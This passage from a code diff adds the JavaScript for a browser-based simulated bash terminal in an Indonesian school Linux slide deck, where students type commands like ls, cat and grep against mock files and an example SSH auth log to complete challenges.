+        currentSlide--;
+        updateMeta();
+      }
+    }
+
+    // Engine Eksekusi Terminal Bash Simulasi
+    function handleTerminalInput(e, slideIdx, targetCommand) {
+      const inp = document.getElementById(`term-input-${slideIdx}`);
+      const historyDiv = document.getElementById(`cmd-history-output-${slideIdx}`);
+      const statusBadge = document.getElementById(`status-badge-${slideIdx}`);
+
+      if (e.key === "Enter") {
+        const rawCmd = inp.value.trim();
+        if (!rawCmd) return;
+
+        cmdHistory.push(rawCmd);
+        historyIdx = cmdHistory.length;
+
+        const entryHtml = document.createElement("div");
+        entryHtml.className = "history-entry";
+        entryHtml.innerHTML = `<div><span class="term-prompt">siswa@wikrama-lab</span>:<span class="term-path">${currentDir}</span><span class="term-char">$</span> ${escapeHtml(rawCmd)}</div>`;
+
+        const [outputHtml, isSuccess] = executeMockBash(rawCmd);
+        entryHtml.innerHTML += outputHtml;
+        historyDiv.appendChild(entryHtml);
+
+        const cleanRaw = rawCmd.replace(/\s+/g, " ").trim();
+        const cleanTarget = targetCommand.replace(/\s+/g, " ").trim();
+
+        if (cleanTarget && (cleanRaw === cleanTarget || cleanRaw.includes(cleanTarget))) {
+          statusBadge.className = "challenge-status status-success";
+          statusBadge.innerText = "✓ TANTANGAN BERHASIL!";
+          const successAlert = document.createElement("div");
+          successAlert.className = "term-output success-msg";
+          successAlert.innerText = "🎉 Bagus sekali! Perintah tepat dan berhasil dieksekusi.";
+          historyDiv.appendChild(successAlert);
+        }
+
+        inp.value = "";
+        const screen = document.getElementById(`term-screen-${slideIdx}`);
+        screen.scrollTop = screen.scrollHeight;
+      } else if (e.key === "ArrowUp") {
+        if (cmdHistory.length > 0 && historyIdx > 0) {
+          historyIdx--;
+          inp.value = cmdHistory[historyIdx];
+        }
+      } else if (e.key === "ArrowDown") {
+        if (historyIdx < cmdHistory.length - 1) {
+          historyIdx++;
+          inp.value = cmdHistory[historyIdx];
+        } else {
+          historyIdx = cmdHistory.length;
+          inp.value = "";
+        }
+      }
+    }
+
+    function executeMockBash(cmd) {
+      const parts = cmd.split(" ");
+      const base = parts[0].toLowerCase();
+
+      // Penanganan Operator Pipeline
+      if (cmd.includes("| grep")) {
+        const grepTarget = cmd.split("| grep")[1].replace(/["']/g, "").trim();
+        if (cmd.startsWith("cat status.txt")) {
+          return [`<div class="term-output">Kasus 01 Selesai\nKasus 02 Dibuka</div>`, true];
+        }
+        if (cmd.startsWith("cat /var/log/auth.log")) {
+          const lines = virtualFiles["/var/log/auth.log"].split("\n");
+          const res = lines.filter(l => l.toLowerCase().includes(grepTarget.toLowerCase())).join("\n");
+          return [`<div class="term-output" style="color:#a7f3d0;">${escapeHtml(res || "Tidak ada hasil cocok.")}</div>`, true];
+        }
+      }
+
+      switch (base) {
+        case "pwd":
+          return [`<div class="term-output">${currentDir === "~" ? "/home/siswa" : currentDir}</div>`, true];
+
+        case "whoami":
+          return [`<div class="term-output">siswa</div>`, true];
+
+        case "id":
+          return [`<div class="term-output">uid=1000(siswa) gid=1000(siswa) groups=1000(siswa),27(sudo),1001(tkj)</div>`, true];
+
+        case "wc":
+          return [`<div class="term-output">4 /var/log/auth.log</div>`, true];
+
+        case "clear":
+          setTimeout(() => {
+            const hist = document.getElementById(`cmd-history-output-${currentSlide}`);
+            if (hist) hist.innerHTML = "";
+          }, 50);
+          return ["", true];
+
+        case "history":
+          let histOut = cmdHistory.map((c, i) => `  ${String(i + 1).padStart(4, " ")}  ${escapeHtml(c)}`).join("\n");
+          return [`<div class="term-output">${histOut || "  1  history"}</div>`, true];
+
+        case "echo":
+          if (cmd.includes("$SHELL")) return [`<div class="term-output">/bin/bash</div>`, true];
+          if (cmd.includes("$PATH")) return [`<div class="term-output">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</div>`, true];
+          if (cmd.includes("> status.txt") || cmd.includes(">> status.txt")) {
+            return ["", true];
+          }
+          const textMatch = cmd.match(/echo\s+["']?([^"'>]+)["']?/);
+          const echoText = textMatch ? textMatch[1] : parts.slice(1).join(" ");
+          return [`<div class="term-output">${escapeHtml(echoText)}</div>`, true];
+
+        case "cd":
+          const target = parts[1] || "~";
+          if (target === "~" || target === "/home/siswa") {
+            currentDir = "~";
+            return ["", true];
+          } else if (target === "/var/log" || target === "log") {
+            currentDir = "/var/log";
+            return ["", true];
+          } else if (target === "..") {
+            currentDir = currentDir === "/var/log" ? "/var" : "/";
+            return ["", true];
+          } else if (target === "/folder_palsu") {
+            return [`<div class="term-output error">bash: cd: /folder_palsu: No such file or directory</div>`, false];
+          } else {
+            return [`<div class="term-output error">bash: cd: ${escapeHtml(target)}: No such file or directory</div>`, false];
+          }
+
+        case "ls":
+          const isAll = cmd.includes("-a") || cmd.includes("-la") || cmd.includes("-al");
+          let list = virtualFS[currentDir] || ["target.txt", "status.txt"];
+          if (!isAll) {
+            list = list.filter(f => !f.startsWith("."));
+          }
+          if (cmd.includes("-l")) {
+            const longOut = list.map(f => {
+              const isDir = f.endsWith("/") || f === "documents" || f === "downloads";
+              const perm = isDir ? "drwxr-xr-x 2 siswa siswa 4096 Sep 21 08:30 " : "-rw-r--r-- 1 siswa siswa 1024 Sep 21 08:30 ";
+              return `${perm} ${f}`;
+            }).join("\n");
+            return [`<div class="term-output">${escapeHtml(longOut)}</div>`, true];
+          }
+          return [`<div class="term-output" style="color: #38bdf8; font-weight: 600;">${list.join("   ")}</div>`, true];
+
+        case "cat":
+          const fileToRead = parts[1] || "";
+          if (!fileToRead) return [`<div class="term-output error">cat: missing operand</div>`, false];
+          if (virtualFiles[fileToRead]) {
+            return [`<div class="term-output">${escapeHtml(virtualFiles[fileToRead])}</div>`, true];
+          }
+          return [`<div class="term-output error">cat: ${escapeHtml(fileToRead)}: No such file or directory</div>`, false];
+
+        case "tail":
+          return [`<div class="term-output">Sep 21 10:14:02 srv sshd[1210]: Failed password for admin from 192.168.1.105 port 44214
+Sep 21 10:15:20 srv sshd[1220]: Accepted password for siswa from 192.168.1.50 port 51200</div>`, true];
+
+        case "touch":
+          const newFile = parts[1] || "file.txt";
+          if (!virtualFS[currentDir]) virtualFS[currentDir] = [];
+          if (!virtualFS[currentDir].includes(newFile)) virtualFS[currentDir].push(newFile);
+          virtualFiles[newFile] = "";
+          return ["", true];
+
+        case "mkdir":
+          const newDir = parts[1] || "new_folder";
+          if (!virtualFS[currentDir]) virtualFS[currentDir] = [];
+          virtualFS[currentDir].push(newDir + "/");
+          return ["", true];
+
+        case "cp":
+        case "mv":
+        case "rm":
+          return ["", true];
+
+        case "find":
+          return [`<div class="term-output">./status.txt\n./target.txt\n./documents/catatan.txt</div>`, true];
+
+        case "cut":
+          return [`<div class="term-output">Kasus\nKasus</div>`, true];
+
+        case "grep":
+          if (cmd.includes("Failed") || cmd.includes("failed")) {
+            const lines = virtualFiles["/var/log/auth.log"].split("\n");
+            const filtered = lines.filter(l => l.toLowerCase().includes("failed")).join("\n");
+            if (cmd.includes("-c")) return [`<div class="term-output">3</div>`, true];
+            return [`<div class="term-output" style="color: #fca5a5;">${escapeHtml(filtered)}</div>`, true];
+          } else if (cmd.includes("Accepted")) {
+            return [`<div class="term-output" style="color: #86efac;">Sep 21 10:15:20 srv sshd[1220]: Accepted password for siswa from 192.168.1.50 port 51200</div>`, true];
+          } else if (cmd.includes("-v \"root\"")) {
+            return [`<div class="term-output">Sep 21 10:14:02 srv sshd[1210]: Failed password for admin from 192.168.1.105 port 44214\nSep 21 10:15:20 srv sshd[1220]: Accepted password for siswa from 192.168.1.50 port 51200</div>`, true];
+          } else if (cmd.includes("^Sep")) {
+            return [`<div class="term-output">${escapeHtml(virtualFiles["/var/log/auth.log"])}</div>`, true];
+          } else if (cmd.includes("51200$")) {
+            return [`<div class="term-output">Sep 21 10:15:20 srv sshd[1220]: Accepted password for siswa from 192.168.1.50 port 51200</div>`, true];
+          } else if (cmd.includes("--help")) {
+            return [`<div class="term-output">Usage: grep [OPTION...] PATTERNS [FILE...]
+Search for PATTERNS in each FILE.
+Example: grep -i 'hello world' menu.h main.c
+
+Pattern selection and interpretation:
+  -E, --extended-regexp     PATTERNS are extended regular expressions
+  -F, --fixed-strings       PATTERNS are strings
+  -G, --basic-regexp        PATTERNS are basic regular expressions
+  -e, --regexp=PATTERNS     use PATTERNS for matching
+  -f, --file=FILE           take PATTERNS from FILE
+  -i, --ignore-case         ignore case distinctions in patterns and data</div>`, true];
+          }
+          return [`<div class="term-output">Usage: grep [OPTION...] PATTERNS [FILE...]</div>`, true];
+
+        default:
+          return [`<div class="term-output error">bash: ${escapeHtml(base)}: command not found</div>`, false];
+      }
+    }
+
+    function escapeHtml(text) {
+      return text
+        .replace(/&/g, "&amp;")
+        .replace(/</g, "&lt;")
+        .replace(/>/g, "&gt;")
+        .replace(/"/g, "&quot;")
+        .replace(/'/g, "&#039;");
+    }
+
+    document.addEventListener("keydown", (e) => {
+      const activeEl = document.activeElement;
+      const isTyping = activeEl && (activeEl.classList.contains("term-input") || activeEl.id === "sidebar-filter");
+
+      if (e.key === "m" || e.key === "M") {
+        if (!isTyping) {
+          e.preventDefault();
+          toggleSidebar();
+          return;
+        }
+      }
+
+      if (e.key === "Escape") {
+        if (slideSidebar.classList.contains("open")) {
+          toggleSidebar();
+          return;
+        }
+      }
+
+      if (!isTyping) {
+        if (e.key === "ArrowRight" || e.key === " ") {
+          nextSlide();
+        } else if (e.key === "ArrowLeft") {
+          prevSlide();
+        }
+      }
+    });
+
+    renderDeck();
+  </script>
+</body>
+</html>
